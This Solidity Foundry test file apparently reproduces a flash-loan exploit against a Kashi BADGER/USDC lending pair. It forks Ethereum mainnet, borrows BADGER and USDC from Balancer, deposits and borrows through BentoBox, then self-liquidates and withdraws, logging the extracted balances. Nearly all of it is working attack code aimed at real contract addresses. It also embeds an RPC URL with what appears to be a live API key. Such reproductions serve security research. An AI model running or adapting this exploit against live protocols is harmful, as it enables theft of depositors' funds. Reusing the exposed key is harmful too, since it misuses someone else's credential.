// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Counter.sol";

contract AttackContract is Test{
    address constant Vault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant BentoBoxV1 = 0xF5BCE5077908a1b7370B9ae04AdC565EBd643966;
    address constant KashiMediumRisk = 0x2cBA6Ab6574646Badc84F0544d05059e57a5dc42; 
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant BADGER = 0x3472A5A71965499acd81997a54BBA8D852C6E53d;
    address constant kmBADGER_USDC_LINK = 0xa898974410F7e7689bb626B41BC2292c6A0f5694;
    uint256 constant USDC_AMOUNT = 121904000000;
    uint256 constant BADGER_AMOUNT = 40900000000000000000000;

    function setUp() public {
        string memory url = "https://eth-mainnet.g.alchemy.com/v2/qb4zUY4FDtmZMhaAEHblyllY9gc1nj2S";
        vm.createSelectFork(url, 15928594);
        vm.label(USDC, "USDC");
        vm.label(BADGER, "BADGER");
        vm.label(kmBADGER_USDC_LINK, "kmBADGER_USDC_LINK");
        vm.label(Vault, "BalancerVault");
        vm.label(BentoBoxV1, "BentoBoxV1");
        vm.label(KashiMediumRisk, "KashiMediumRisk");
    }

    function testExploit() public{
        IERC20[] memory addr = new IERC20[](2);
        addr[0] = IERC20(BADGER);
        addr[1] = IERC20(USDC);
        uint256[] memory amount = new uint256[](2);
        amount[0] = BADGER_AMOUNT;
        amount[1] = USDC_AMOUNT;
        IVault(Vault).flashLoan(IFlashLoanRecipient(address(this)), addr, amount, "");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        IBentoBoxV1(BentoBoxV1).setMasterContractApproval(address(this), KashiMediumRisk, true, 0, bytes32(0), bytes32(0));
        IERC20(BADGER).approve(BentoBoxV1, type(uint256).max);
        IBentoBoxV1(BentoBoxV1).deposit(IERC20(BADGER), address(this), address(this), 0, BADGER_AMOUNT);
        IKashi(kmBADGER_USDC_LINK).addCollateral(address(this), false, BADGER_AMOUNT);

        IERC20(USDC).approve(BentoBoxV1, type(uint256).max);
        IBentoBoxV1(BentoBoxV1).deposit(IERC20(USDC), address(this), address(this), 0, 112529000000);
        IKashi(kmBADGER_USDC_LINK).addAsset(address(this), false, 112529000000);
        IKashi(kmBADGER_USDC_LINK).borrow(address(this), 121904280000);
        console.log("Borrow time exchange rate: %s", IKashi(kmBADGER_USDC_LINK).exchangeRate());

        address[] memory usr = new address[](1);
        usr[0] = address(this);
        uint256[] memory amt = new uint256[](1);
        amt[0] = 101363082522;
        IKashi(kmBADGER_USDC_LINK).liquidate(usr, amt, address(this), ISwapper(address(0)), true);
        IKashi(kmBADGER_USDC_LINK).removeAsset(address(this), IKashi(kmBADGER_USDC_LINK).balanceOf(address(this))*95/100);

        console.log("Balance of USDC: %s", IBentoBoxV1(BentoBoxV1).balanceOf(IERC20(USDC), address(this)));
        console.log("Balance of BADGER: %s", IBentoBoxV1(BentoBoxV1).balanceOf(IERC20(BADGER), address(this)));

        IBentoBoxV1(BentoBoxV1).withdraw(IERC20(USDC), address(this), address(this), 0, IBentoBoxV1(BentoBoxV1).balanceOf(IERC20(USDC), address(this)));
        IBentoBoxV1(BentoBoxV1).withdraw(IERC20(BADGER), address(this), address(this), 0, IBentoBoxV1(BentoBoxV1).balanceOf(IERC20(BADGER), address(this)));
        console.log("Balance of USDC: %s", IERC20(USDC).balanceOf(address(this)));
        console.log("Balance of BADGER: %s", IERC20(BADGER).balanceOf(address(this)));

        //repay flashloan
        IERC20(USDC).transfer(msg.sender, USDC_AMOUNT);
    } 

}

interface IVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;

    event FlashLoan(IFlashLoanRecipient indexed recipient, IERC20 indexed token, uint256 amount, uint256 feeAmount);

}

interface IERC20 {
  event Approval(address indexed owner, address indexed spender, uint256 value);
  event Transfer(address indexed from, address indexed to, uint256 value);

  function name() external view returns (string memory);

  function symbol() external view returns (string memory);

  function decimals() external view returns (uint8);

  function totalSupply() external view returns (uint256);

  function balanceOf(address owner) external view returns (uint256);

  function allowance(address owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 value) external returns (bool);

  function transfer(address to, uint256 value) external returns (bool);

  function transferFrom(address from, address to, uint256 value) external returns (bool);

  function withdraw(uint256 wad) external;

  function deposit(uint256 wad) external returns (bool);

}

interface IBentoBoxV1 {
    function balanceOf(IERC20, address) external view returns (uint256);
    function deposit(IERC20 token_, address from, address to, uint256 amount, uint256 share) external payable returns (uint256 amountOut, uint256 shareOut);
    function harvest(IERC20 token, bool balance, uint256 maxChangeAmount) external;
    function masterContractApproved(address, address) external view returns (bool);
    function masterContractOf(address) external view returns (address);
    function nonces(address) external view returns (uint256);
    function owner() external view returns (address);
    function setMasterContractApproval(address user, address masterContract, bool approved, uint8 v, bytes32 r, bytes32 s) external;
    function withdraw(IERC20 token_, address from, address to, uint256 amount, uint256 share) external returns (uint256 amountOut, uint256 shareOut);
}

interface IFlashLoanRecipient {
    /**
     * @dev When `flashLoan` is called on the Vault, it invokes the `receiveFlashLoan` hook on the recipient.
     *
     * At the time of the call, the Vault will have transferred `amounts` for `tokens` to the recipient. Before this
     * call returns, the recipient must have transferred `amounts` plus `feeAmounts` for each token back to the
     * Vault, or else the entire flash loan will revert.
     *
     * `userData` is the same value passed in the `IVault.flashLoan` call.
     */
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IKashi {
    
    function addCollateral(
        address to,
        bool skim,
        uint256 share
    ) external;

    function addAsset(
        address to,
        bool skim,
        uint256 share
    ) external returns (uint256 fraction);

    function borrow(address to, uint256 amount) external returns (uint256 part, uint256 share);

    function userCollateralShare(address) external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function exchangeRate() external view returns (uint256);

    function updateExchangeRate() external returns (bool updated, uint256 rate);

    function liquidate(
        address[] calldata users,
        uint256[] calldata maxBorrowParts,
        address to,
        ISwapper swapper,
        bool open
    ) external;

    function removeAsset(address to, uint256 fraction) external returns (uint256 share);

}

interface ISwapper {
    /// @notice Withdraws 'amountFrom' of token 'from' from the BentoBox account for this swapper.
    /// Swaps it for at least 'amountToMin' of token 'to'.
    /// Transfers the swapped tokens of 'to' into the BentoBox using a plain ERC20 transfer.
    /// Returns the amount of tokens 'to' transferred to BentoBox.
    /// (The BentoBox skim function will be used by the caller to get the swapped funds).
    function swap(
        IERC20 fromToken,
        IERC20 toToken,
        address recipient,
        uint256 shareToMin,
        uint256 shareFrom
    ) external returns (uint256 extraShare, uint256 shareReturned);

    /// @notice Calculates the amount of token 'from' needed to complete the swap (amountFrom),
    /// this should be less than or equal to amountFromMax.
    /// Withdraws 'amountFrom' of token 'from' from the BentoBox account for this swapper.
    /// Swaps it for exactly 'exactAmountTo' of token 'to'.
    /// Transfers the swapped tokens of 'to' into the BentoBox using a plain ERC20 transfer.
    /// Transfers allocated, but unused 'from' tokens within the BentoBox to 'refundTo' (amountFromMax - amountFrom).
    /// Returns the amount of 'from' tokens withdrawn from BentoBox (amountFrom).
    /// (The BentoBox skim function will be used by the caller to get the swapped funds).
    function swapExact(
        IERC20 fromToken,
        IERC20 toToken,
        address recipient,
        address refundTo,
        uint256 shareFromSupplied,
        uint256 shareToExact
    ) external returns (uint256 shareUsed, uint256 shareReturned);
}
